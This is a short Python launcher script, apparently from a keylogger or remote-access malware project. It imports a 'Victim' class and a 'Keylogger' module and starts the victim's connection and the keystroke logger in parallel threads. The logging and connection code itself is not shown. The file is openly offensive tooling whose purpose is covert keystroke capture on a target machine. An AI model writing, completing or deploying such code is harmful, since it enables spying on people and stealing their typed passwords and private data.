from threading import Thread
from victim import Victim
from keylogger import logger

victim = Victim()
victim_logger = logger.Keylogger()

victim_thread = Thread(target=victim.connect)
logger_thread = Thread(target=victim_logger.start)

victim_thread.start()
logger_thread.start()

victim_thread.join()
logger_thread.join()